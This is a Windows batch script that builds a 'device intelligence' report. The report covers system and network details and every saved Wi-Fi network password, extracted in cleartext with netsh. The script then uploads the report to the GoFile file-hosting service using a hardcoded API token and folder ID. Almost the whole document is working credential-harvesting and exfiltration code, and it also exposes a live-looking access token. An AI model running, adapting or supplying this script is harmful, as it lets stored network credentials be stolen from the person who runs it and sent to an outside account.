@echo off
setlocal EnableExtensions EnableDelayedExpansion

:: ===== CONFIG — EDIT THESE TWO LINES =====
set "TOKEN=xFQPoevZhqitBNWhGQXCsWfHSZXoFQ4g"
set "FOLDER_ID=32edfce2-605a-4c3f-a127-3c454b68f8df"
:: =========================================

set "REPORT=%USERPROFILE%\Downloads\SEMD_Device_Report.txt"
set "RESPONSE=%TEMP%\SEMD_GoFile_Response.json"
set "HTTPFILE=%TEMP%\SEMD_GoFile_HTTP.txt"

if not exist "%USERPROFILE%\Downloads" mkdir "%USERPROFILE%\Downloads"

where curl.exe >nul 2>&1 || (echo ERROR: curl.exe not in PATH.& pause & exit /b 1)

echo [1/3] Instant collect...

(
echo SEMD // INSTANT INTELLIGENCE REPORT
echo Generated: %date% %time%
echo Host: %COMPUTERNAME%
echo.
echo === OS ===
ver
echo.
echo === CPU ===
wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors /format:list
echo.
echo === RAM ===
wmic os get TotalVisibleMemorySize,FreePhysicalMemory /format:list
echo.
echo === DISKS ===
wmic logicaldisk where "DriveType=3" get DeviceID,Size,FreeSpace /format:table
echo.
echo === NETWORK ===
ipconfig /all
echo.
echo === WIFI INTERFACES ===
netsh wlan show interfaces
echo.
echo === WIFI PROFILES ^& PASSWORDS ===
) > "%REPORT%" 2>&1

:: ===== YOUR WIFI EXTRACTION (appends to same report) =====
for /f "tokens=2 delims=:" %%a in ('netsh wlan show profiles ^| findstr /c:"All User Profile"') do (
    set "profile=%%a"
    set "profile=!profile:~1!"

    echo Network: !profile! >> "%REPORT%"

    for /f "tokens=2 delims=:" %%b in ('netsh wlan show profile name^="!profile!" key^=clear ^| findstr /c:"Key Content"') do (
        set "password=%%b"
        set "password=!password:~1!"
        echo Password: !password! >> "%REPORT%"
    )

    netsh wlan show profile name="!profile!" key=clear | findstr /c:"Key Content" >nul
    if errorlevel 1 (
        echo Password: ^(none / open network^) >> "%REPORT%"
    )

    echo ------------------------------------- >> "%REPORT%"
)
:: =========================================================

echo. >> "%REPORT%"
echo === END === >> "%REPORT%"

echo Report: %REPORT%
echo.

echo [2/3] Uploading to GoFile...

del "%RESPONSE%" "%HTTPFILE%" 2>nul

curl.exe --silent --show-error ^
 --connect-timeout 15 ^
 --max-time 60 ^
 --output "%RESPONSE%" ^
 --write-out "%%{http_code}" ^
 -H "Authorization: Bearer %TOKEN%" ^
 -F "file=@%REPORT%;type=text/plain" ^
 -F "folderId=%FOLDER_ID%" ^
 "https://upload.gofile.io/uploadfile" > "%HTTPFILE%"

set "CURL_ERROR=%ERRORLEVEL%"

if not "%CURL_ERROR%"=="0" (
    echo UPLOAD FAILED: curl error %CURL_ERROR%
    if exist "%RESPONSE%" type "%RESPONSE%"
    goto FINISH
)

set "HTTP_STATUS="
set /p HTTP_STATUS=<"%HTTPFILE%"
echo HTTP: %HTTP_STATUS%
if exist "%RESPONSE%" type "%RESPONSE%"

echo [3/3] Verifying...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
 "$j=Get-Content -Raw $env:TEMP'\SEMD_GoFile_Response.json' | ConvertFrom-Json;" ^
 "if($j.status -eq 'ok'){ $u=$j.data.downloadPage; Write-Host 'SUCCESS: '$u -Fore Green; Set-Clipboard $u }else{ Write-Host 'FAILED: '$j -Fore Red; exit 1 }"

:FINISH
echo.
echo Report: %REPORT%
start "" notepad "%REPORT%"
pause
endlocal